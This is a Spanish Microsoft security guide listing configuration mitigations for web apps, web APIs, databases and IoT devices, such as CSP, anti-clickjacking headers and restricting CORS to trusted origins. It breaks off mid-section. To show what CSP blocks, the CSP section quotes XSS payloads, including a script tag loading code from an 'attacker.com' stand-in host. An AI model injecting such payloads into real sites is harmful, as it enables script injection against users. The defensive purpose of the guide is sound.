---
title: Administración de configuración para Microsoft Threat Modeling Tool
titleSuffix: Azure
description: Más información sobre la administración de configuración de Threat Modeling Tool. Consulte la información de mitigación y los ejemplos de código.
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.subservice: security-develop
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.custom: devx-track-javascript, devx-track-csharp
ms.openlocfilehash: 3aeaebe49999ce65779072f8579a404f9397d50d
ms.sourcegitcommit: 58d3b3314df4ba3cabd4d4a6016b22fa5264f05a
ms.translationtype: HT
ms.contentlocale: es-ES
ms.lasthandoff: 09/02/2020
ms.locfileid: "89299990"
---
# <a name="security-frame-configuration-management--mitigations"></a>Marco de seguridad: Administración de configuración | Mitigaciones 
| Producto o servicio | Artículo |
| --------------- | ------- |
| **Aplicación web** | <ul><li>[Implementación de la directiva de seguridad de contenido [CSP] y deshabilitación de Javascript en línea](#csp-js)</li><li>[Habilitación del filtro XSS del explorador](#xss-filter)</li><li>[Deshabilitación obligatoria del seguimiento y la depuración de las aplicaciones ASP.NET antes de la implementación](#trace-deploy)</li><li>[Acceso exclusivo a archivos JavaScript de terceros de orígenes de confianza](#js-trusted)</li><li>[Comprobación de que las páginas con autenticación con ASP.NET incorporan defensas contra el secuestro de clic](#ui-defenses)</li><li>[Comprobación de que solo se permiten orígenes de confianza si CORS está activado en las aplicaciones web ASP.NET](#cors-aspnet)</li><li>[Habilitación del atributo ValidateRequest en las páginas de ASP.NET](#validate-aspnet)</li><li>[Uso de las últimas versiones locales de las bibliotecas de JavaScript](#local-js)</li><li>[Deshabilitación del rastreo automático de MIME](#mime-sniff)</li><li>[Eliminación de encabezados de servidor estándar de los sitios web de Windows Azure para evitar la creación de huellas digitales](#standard-finger)</li></ul> |
| **Base de datos** | <ul><li>[Configuración de Firewall de Windows para el acceso al motor de base de datos](#firewall-db)</li></ul> |
| **API web** | <ul><li>[Comprobación de que solo se permiten orígenes de confianza si CORS está activado en ASP.NET Web API](#cors-api)</li><li>[Cifrado de secciones de los archivos de configuración de la API web que contienen datos confidenciales](#config-sensitive)</li></ul> |
| **Dispositivo IoT** | <ul><li>[Comprobación de que todas las interfaces de administración están protegidas con credenciales seguras](#admin-strong)</li><li>[Comprobación de que no se puede ejecutar código desconocido en los dispositivos](#unknown-exe)</li><li>[Cifrado del sistema operativo y particiones adicionales en los dispositivos IoT con Bitlocker](#partition-iot)</li><li>[Comprobación de que solo se habilita el mínimo número de servicios o características en los dispositivos](#min-enable)</li></ul> |
| **Puerta de enlace de campo de IoT** | <ul><li>[Cifrado del sistema operativo y particiones adicionales en la puerta de enlace de campo de IoT con Bitlocker](#field-bit-locker)</li><li>[Comprobación de que las credenciales de inicio de sesión predeterminadas de la puerta de enlace de campo se modifican durante la instalación](#default-change)</li></ul> |
| **Puerta de enlace de nube de IoT** | <ul><li>[Comprobación de que la puerta de enlace de la nube implementa un proceso para mantener actualizado el firmware de los dispositivos conectados](#cloud-firmware)</li></ul> |
| **Límite de confianza de la máquina** | <ul><li>[Comprobación de que los dispositivos tienen controles de seguridad de punto de conexión configurados según las directivas organizativas](#controls-policies)</li></ul> |
| **Almacenamiento de Azure** | <ul><li>[Comprobación de la administración segura de las claves de acceso de almacenamiento de Azure](#secure-keys)</li><li>[Comprobación de que solo se permiten orígenes de confianza si CORS está activado en Azure Storage](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Habilitación de la característica de limitación del servicio de WCF](#throttling)</li><li>[Revelación de información de WCF mediante metadatos](#info-metadata)</li></ul> | 

## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>Implementación de la directiva de seguridad de contenido [CSP] y deshabilitación de Javascript en línea

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Aplicación web | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | N/D  |
| **Referencias**              | [An Introduction to Content Security Policy](https://www.html5rocks.com/en/tutorials/security/content-security-policy/) (Introducción a la directiva de seguridad del contenido), [Content Security Policy Reference](https://content-security-policy.com/) (Referencia a la directiva de seguridad del contenido), [Security features](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/) (Características de seguridad), [Introduction to content security policy](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) (Introducción a la directiva de seguridad del contenido), [Can I use CSP?](https://caniuse.com/#feat=contentsecuritypolicy) (¿Puedo usar la directiva de seguridad de contenido [CSP]?) |
| **Pasos** | <p>La directiva de seguridad de contenido (CSP) es un mecanismo de seguridad de defensa en profundidad, una norma de W3C, que permite controlar el contenido insertado en el sitio a los propietarios de aplicaciones web. La CSP se agrega como encabezado de respuesta HTTP al servidor web y se aplica en los exploradores del lado del cliente. Es una directiva basada en una lista de elementos permitidos: un sitio web puede declarar un conjunto de dominios de confianza desde los que se puede cargar contenido activo, como JavaScript.</p><p>La CSP ofrece las siguientes ventajas de seguridad:</p><ul><li>**Protección frente a XSS:** si una página es vulnerable a XSS, los atacantes pueden aprovecharlo de dos maneras:<ul><li>Insertando `<script>malicious code</script>`. Esta vulnerabilidad de seguridad no funcionará debido a la restricción básica 1 de CSP.</li><li>Insertando `<script src="http://attacker.com/maliciousCode.js"/>`. Esta vulnerabilidad de seguridad no funcionará, ya que el dominio que controla el atacante no estará en la lista de dominios permitidos de CSP.</li></ul></li><li>**Control de la exfiltración de datos:** si cualquier contenido malintencionado de una página web intenta conectarse a un sitio web externo y robar datos, la CSP anulará la conexión. Esto se debe a que el dominio de destino no estará en la lista de elementos permitidos de CSP.</li><li>**Defensa contra el secuestro de clic:** el secuestro de clic es una técnica de ataque con la que un adversario puede enmarcar un sitio web auténtico y forzar a los usuarios a hacer clic en elementos de la interfaz de usuario. La defensa actual contra el secuestro de clic se consigue mediante la configuración de un encabezado de respuesta X-Frame-Option. No todos los exploradores respetan este encabezado y la implementación de la CSP será un método estándar de defensa contra el secuestro de clic</li><li>**Informes de ataques en tiempo real:** si se produce un ataque de inserción de código en un sitio web con la CSP habilitada, los exploradores desencadenarán automáticamente una notificación a un punto de conexión configurado en el servidor web. De esta manera, la CSP actúa como sistema de advertencia en tiempo real.</li></ul> |

### <a name="example"></a>Ejemplo
Ejemplo de directiva: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Esta directiva permite a los scripts cargar solo desde el servidor de la aplicación web y de Google Analytics. Se rechazarán los scripts que se carguen desde cualquier otro sitio. Cuando se habilita la CSP en un sitio web, para mitigar los ataques XSS, se deshabilitan automáticamente las siguientes características. 

### <a name="example"></a>Ejemplo
Los scripts en línea no se ejecutarán. Ejemplos de scripts en línea 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
javascript:alert(1);
```

### <a name="example"></a>Ejemplo
Las cadenas no se evaluarán como código. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a name="enable-browsers-xss-filter"></a><a id="xss-filter"></a>Habilitación del filtro XSS del explorador

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Aplicación web | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | N/D  |
| **Referencias**              | [Filtro de protección de XSS](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
| **Pasos** | <p>La configuración del encabezado de respuesta X-XSS-Protection controla el filtro de script entre sitios del explorador. Este encabezado de respuesta puede tener los siguientes valores:</p><ul><li>`0:` Esto deshabilitará el filtro</li><li>`1: Filter enabled` Si se detecta un ataque de scripting entre sitios (XSS), para detenerlo, el explorador saneará la página</li><li>`1: mode=block : Filter enabled`. En lugar de sanearla, cuando se detecta un ataque XSS, el explorador impedirá la representación de la página</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. El explorador saneará la página y notificará la infracción.</li></ul><p>Se trata de una función de cromo que usa los informes de infracción de la CSP para enviar detalles al URI que elija. Las 2 últimas opciones se consideran valores seguros.</p>|

## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>Deshabilitación obligatoria del seguimiento y la depuración de las aplicaciones ASP.NET antes de la implementación

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Aplicación web | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | N/D  |
| **Referencias**              | [ASP.NET Debugging Overview](https://msdn.microsoft.com/library/ms227556.aspx)(Información general de depuración ASP.NET), [ASP.NET Tracing Overview](https://msdn.microsoft.com/library/bb386420.aspx) (Información general de seguimiento ASP.NET), [How to: Enable Tracing for an ASP.NET Application](https://msdn.microsoft.com/library/0x5wc973.aspx) (Habilitación del seguimiento para una aplicación ASP.NET), [How to: Enable Debugging for ASP.NET Applications](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) (Habilitación de la depuración para aplicaciones ASP.NET). |
| **Pasos** | Cuando el seguimiento está habilitado para la página, cada explorador que lo solicite también obtiene la información de seguimiento con los datos del estado interno del servidor y del flujo de trabajo. Esta información podría ser confidencial. Cuando está habilitada la depuración en la página, los errores que se producen en el servidor provocan el seguimiento de pila completo de los datos que se presenta al explorador. Esos datos pueden exponer información confidencial del flujo de trabajo del servidor. |

## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>Acceso exclusivo a archivos JavaScript de terceros de orígenes de confianza

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Aplicación web | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | N/D  |
| **Referencias**              | N/D  |
| **Pasos** | debe hacerse referencia a archivos JavaScript de terceros únicamente desde orígenes de confianza. Los puntos de conexión de referencia deben estar siempre en TLS. |

## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Comprobación de que las páginas con autenticación con ASP.NET incorporan defensas contra el secuestro de clic

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Aplicación web | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | N/D  |
| **Referencias**              | [OWASP click-jacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html) (Hoja de referencia rápida de OWASP sobre la defensa ante el secuestro de clic), [IE Internals - Combating click-jacking With X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) (Elementos internos de Internet Explorer: combatir el secuestro de clic con X-Frame-Options) |
| **Pasos** | <p>el secuestro de clic, también conocido como "clickjacking" o "ataque UI redress", se produce cuando un atacante utiliza varias capas transparentes u opacas para engañar al usuario para que haga clic en un botón o vínculo de otra página al intentar hacer clic en la página del nivel superior.</p><p>Estas capas se logran al elaborar una página malintencionada con un iframe, que carga la página de la víctima. Por lo tanto, el atacante "secuestra" el clic destinado a su página y los enruta a otra página, muy probablemente propiedad de otra aplicación, dominio o ambos. Para evitar el secuestro de clic, establezca los encabezados de respuesta HTTP X-Frame-Options adecuados que indiquen al explorador que no permita enmarcar a otros dominios</p>|

### <a name="example"></a>Ejemplo
El encabezado X-FRAME-OPTIONS se puede establecer a través de web.config de IIS. Fragmento de código de web.config para los sitios que nunca deben enmarcarse: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Ejemplo
Código de web.config para los sitios que solo deben enmarcar las páginas del mismo dominio: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-applications"></a><a id="cors-aspnet"></a>Comprobación de que solo se permiten orígenes de confianza si CORS está activado en las aplicaciones web ASP.NET

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Aplicación web | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | Formularios Web Forms, MVC5 |
| **Atributos**              | N/D  |
| **Referencias**              | N/D  |
| **Pasos** | <p>La seguridad del explorador impide que una página web realice solicitudes AJAX a otro dominio. Esta restricción se conoce como la directiva de mismo origen y evita que un sitio malintencionado lea datos confidenciales de otro sitio. Sin embargo, a veces puede ser necesario exponer las API de forma segura para que las consuman otros sitios. Uso compartido de recursos de origen cruzado (CORS) es una norma de W3C que permite mayor flexibilidad a los servidores en la directiva de mismo origen. Con CORS, un servidor puede permitir explícitamente algunas solicitudes de origen cruzado y rechazar otras.</p><p>CORS es más seguro y más flexible que las técnicas anteriores, como JSONP. En esencia, la habilitación de CORS se traduce en la incorporación de algunos encabezados de respuesta HTTP (Access-Control-*) en la aplicación web, lo cual se puede hacer de un par de maneras.</p>|

### <a name="example"></a>Ejemplo
Si se puede acceder a web.config, CORS puede agregarse mediante el siguiente nodo: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Ejemplo
Si no se puede acceder a web.config, CORS puede configurarse mediante la incorporación del código CSharp siguiente: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Tenga en cuenta que es fundamental garantizar que la lista de orígenes del atributo "Access-Control-Allow-Origin" se establece en un conjunto de orígenes finito y de confianza. Si esto no se configura bien (por ejemplo, se establece el valor como "*"), los sitios malintencionados podrán desencadenar solicitudes de origen cruzado a la aplicación web sin restricciones, por lo que la aplicación se volverá vulnerable a ataques CSRF. 

## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>Habilitación del atributo ValidateRequest en las páginas de ASP.NET

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Aplicación web | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | Formularios Web Forms, MVC5 |
| **Atributos**              | N/D  |
| **Referencias**              | [Request Validation - Preventing Script Attacks](https://www.asp.net/whitepapers/request-validation) (Validación de solicitudes: prevención de ataques de script) |
| **Pasos** | <p>La validación de solicitudes, una característica de ASP.NET desde la versión 1.1, impide que el servidor acepte contenido con HTML sin codificar. Esta característica está diseñada para ayudar a evitar algunos ataques de inserción de script mediante los cuales el código de script del cliente o HTML puede enviarse sin que se sepa a un servidor, almacenarse y presentarse a otros usuarios. Se recomienda encarecidamente validar todos los datos de entrada y codificar el código HTML cuando corresponda.</p><p>La validación de solicitudes se realiza mediante la comparación de todos los datos de entrada con una lista de valores peligrosos. Si se produce una coincidencia, ASP.NET genera un `HttpRequestValidationException`. De forma predeterminada, la característica de validación de solicitudes está habilitada.</p>|

### <a name="example"></a>Ejemplo
Sin embargo, se puede deshabilitar en el nivel de página: 
```XML
<%@ Page validateRequest="false" %> 
```
o en el nivel de aplicación 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Tenga en cuenta que esta característica de validación de solicitud no es compatible con la canalización de MVC6 ni forma parte de esta. 

## <a name="use-locally-hosted-latest-versions-of-javascript-libraries"></a><a id="local-js"></a>Uso de las últimas versiones locales de las bibliotecas de JavaScript

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Aplicación web | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | N/D  |
| **Referencias**              | N/D  |
| **Pasos** | <p>Los desarrolladores que utilizan bibliotecas estándar de JavaScript como JQuery deben usar versiones aprobadas de las bibliotecas de JavaScript comunes sin errores de seguridad conocidos. Un procedimiento recomendado es usar la versión más reciente de las bibliotecas, ya que contienen correcciones para las vulnerabilidades de seguridad conocidas de las versiones anteriores.</p><p>Si no se puede usar la versión más reciente por motivos de compatibilidad, debe utilizarse la anterior mínima aceptable.</p><p>Versiones mínimas aceptables:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Validate 1.9</li><li>JQuery Mobile 1.0.1</li><li>JQuery Cycle 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Ajax Control Toolkit**<ul><li>Ajax Control Toolkit 40412</li></ul></li><li>**ASP.NET Web Forms and Ajax**<ul><li>ASP.NET Web Forms and Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>No cargue nunca bibliotecas de JavaScript desde sitios externos, como redes CDN públicas</p>|

## <a name="disable-automatic-mime-sniffing"></a><a id="mime-sniff"></a>Deshabilitación del rastreo automático de MIME

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Aplicación web | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | N/D  |
| **Referencias**              | [IE8 Security Part V: Comprehensive Protection](https://docs.microsoft.com/archive/blogs/ie/ie8-security-part-v-comprehensive-protection) (Seguridad de IE8 [parte V]: protección total), [MIME types](https://en.wikipedia.org/wiki/Mime_type) (Tipos de MIME) |
| **Pasos** | El encabezado X-Content-Type-Options es un encabezado HTTP que permite a los desarrolladores especificar que su contenido no se debe someter a un rastreo de MIME. Este encabezado se ha diseñado para mitigar los ataques de rastreo de MIME. Para cada página que podría incluir contenido controlable por el usuario, debe usar el encabezado HTTP X-Content-Type-Options:nosniff. Para habilitar el encabezado necesario globalmente para todas las páginas de la aplicación, puede realizar una de las siguientes acciones|

### <a name="example"></a>Ejemplo
Agregue el encabezado en el archivo web.config si la aplicación está hospedada en Internet Information Services (IIS) 7 o posteriores. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Ejemplo
Agregue el encabezado mediante el método Application\_BeginRequest global. 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Ejemplo
Implemente un módulo HTTP personalizado 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Ejemplo
Puede habilitar el encabezado necesario solo para páginas específicas si lo agrega a respuestas individuales: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a name="remove-standard-server-headers-on-windows-azure-web-sites-to-avoid-fingerprinting"></a><a id="standard-finger"></a>Eliminación de encabezados de servidor estándar de los sitios web de Windows Azure para evitar la creación de huellas digitales

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Aplicación web | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | EnvironmentType: Azure |
| **Referencias**              | [Removing standard server headers on Windows Azure Web Sites](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) (Eliminación de encabezados de servidor estándar de los sitios web de Windows Azure) |
| **Pasos** | Los encabezados como Server, X-Powered-By y X-AspNet-Version revelan información sobre el servidor y las tecnologías subyacentes. Se recomienda para suprimir estos encabezados para evitar la creación de huellas digitales en la aplicación |

## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>Configuración de Firewall de Windows para el acceso al motor de base de datos

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Base de datos | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | SQL Azure, OnPrem |
| **Atributos**              | N/A, SQL Version: V12 |
| **Referencias**              | [Procedimientos para configurar un firewall de Azure SQL Database](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [Configuración de firewall de Windows para el acceso al motor de base de datos](https://msdn.microsoft.com/library/ms175043) |
| **Pasos** | Los sistemas de firewall ayudan a evitar el acceso no autorizado a los recursos de los equipos. Si desea acceder a una instancia del motor de base de datos de SQL Server a través de un firewall, debe configurar el firewall en el equipo que ejecuta SQL Server para que lo permita |

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-api"></a><a id="cors-api"></a>Comprobación de que solo se permiten orígenes de confianza si CORS está activado en ASP.NET Web API

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | MVC 5 |
| **Atributos**              | N/D  |
| **Referencias**              | [Enabling Cross-Origin Requests in ASP.NET Web API 2](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api) (Habilitación de solicitudes de origen cruzado en ASP-NET Web API 2), [Funciones para CORS en ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Pasos** | <p>La seguridad del explorador impide que una página web realice solicitudes AJAX a otro dominio. Esta restricción se conoce como la directiva de mismo origen y evita que un sitio malintencionado lea datos confidenciales de otro sitio. Sin embargo, a veces puede ser necesario exponer las API de forma segura para que las consuman otros sitios. Uso compartido de recursos de origen cruzado (CORS) es una norma de W3C que permite mayor flexibilidad a los servidores en la directiva de mismo origen.</p><p>Con CORS, un servidor puede permitir explícitamente algunas solicitudes de origen cruzado y rechazar otras. CORS es más seguro y más flexible que las técnicas anteriores, como JSONP.</p>|

### <a name="example"></a>Ejemplo
En App_Start/WebApiConfig.cs, agregue el siguiente código al método WebApiConfig.Register 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Ejemplo
El atributo de EnableCors se puede aplicar a métodos de acción en un controlador como se indica a continuación: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Tenga en cuenta que es fundamental garantizar que la lista de orígenes del atributo EnableCors se establece en un conjunto de orígenes finito y de confianza. Si esto no se configura bien (por ejemplo, se establece el valor como "*"), los sitios malintencionados podrán desencadenar solicitudes de origen cruzado a la API sin restricciones, por lo que la API se volverá vulnerable a ataques CSRF. EnableCors se puede decorar en el nivel de controlador. 

### <a name="example"></a>Ejemplo
Para deshabilitar CORS en un determinado método en una clase, se puede utilizar el atributo DisableCors tal y como se muestra a continuación: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | MVC 6 |
| **Atributos**              | N/D  |
| **Referencias**              | [Habilitación de solicitudes de origen cruzado (CORS) en ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
| **Pasos** | <p>En ASP.NET Core 1.0, CORS puede habilitarse mediante middleware o MVC. Al utilizar MVC para habilitar CORS se utilizan los mismos servicios CORS, pero no middleware de CORS.</p>|

**Enfoque 1** Habilitación de CORS con middleware: para habilitar CORS para toda la aplicación, agregue el middleware de CORS a la canalización de solicitud con el método de extensión UseCors. Cuando se agrega el middleware de CORS mediante la clase CorsPolicyBuilder, puede especificarse una directiva de origen cruzado. Existen dos formas de hacerlo:

### <a name="example"></a>Ejemplo
Lo primero que se hace es llamar a UseCors con una expresión lambda. La expresión lambda toma un objeto CorsPolicyBuilder: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Ejemplo
Lo segundo es definir una o varias directivas CORS con nombre y seleccionar la directiva por el nombre en tiempo de ejecución. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Enfoque 2** Habilitar CORS en MVC: los desarrolladores pueden usar también MVC para aplicar CORS específico por acción, por controlador o globalmente para todos los controladores.

### <a name="example"></a>Ejemplo
Por acción: para especificar una directiva de CORS para una acción específica, agregue el atributo [EnableCors] a la acción. Especifique el nombre de la directiva. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Ejemplo
Por controlador: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Ejemplo
Globalmente: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Tenga en cuenta que es fundamental garantizar que la lista de orígenes del atributo EnableCors se establece en un conjunto de orígenes finito y de confianza. Si esto no se configura bien (por ejemplo, se establece el valor como "*"), los sitios malintencionados podrán desencadenar solicitudes de origen cruzado a la API sin restricciones, por lo que la API se volverá vulnerable a ataques CSRF. 

### <a name="example"></a>Ejemplo
Para deshabilitar CORS en una acción o un controlador, utilice el atributo [DisableCors]. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a name="encrypt-sections-of-web-apis-configuration-files-that-contain-sensitive-data"></a><a id="config-sensitive"></a>Cifrado de secciones de los archivos de configuración de la API web que contienen datos confidenciales

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase de SDL**               | Implementación |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | N/D  |
| **Referencias**              | [Cómo: Encrypt Configuration Sections in ASP.NET 2.0 Using DPAPI](https://msdn.microsoft.com/library/ff647398.aspx) (Procedimiento para cifrar secciones de configuración en ASP.NET 2.0 mediante DPAPI), [Especificar un proveedor de configuración protegida](https://msdn.microsoft.com/library/68ze1hb2.aspx), [Uso de Azure Key Vault para proteger los secretos de la aplicación](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Pasos** | Los archivos de configuración tales como web.config y appsettings.json se suelen usar para almacenar información confidencial, como nombres de usuario, contraseñas, cadenas de conexión a la base de datos y claves de cifrado. Si no protege esta información, la aplicación es vulnerable a atacantes o usuarios malintencionados que obtienen información confidencial, como nombres de usuario y contraseñas de cuentas, nombres de bases de datos y nombres de servidores. Según el tipo de implementación (Azure o local), cifre las secciones confidenciales de los archivos de configuración mediante DPAPI o servicios como Azure Key Vault. |

## <a name="ensure-that-all-admin-interfaces-are-secured-with-strong-credentials"></a><a id="admin-strong"></a>Comprobación de que todas las interfaces de administración están protegidas con credenciales seguras

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase de SDL**               | Implementación |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | N/D  |
| **Referencias**              | N/D  |
| **Pasos** | Las interfaces administrativas que expone la puerta de enlace de dispositivo o campo deben protegerse con credenciales seguras. Además, debe protegerse con credenciales seguras el resto de interfaces expuestas, como Wi-Fi, SSH, recursos compartidos de archivo o FTP. De forma predeterminada, no deben usarse contraseñas poco seguras. |

## <a name="ensure-that-unknown-code-cannot-execute-on-devices"></a><a id="unknown-exe"></a>Comprobación de que no se puede ejecutar código desconocido en los dispositivos

| Título                   | Detalles      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase de SDL**               | Build |  
| **Tecnologías aplicables** | Genérico |
| **Atributos**              | N/D  |
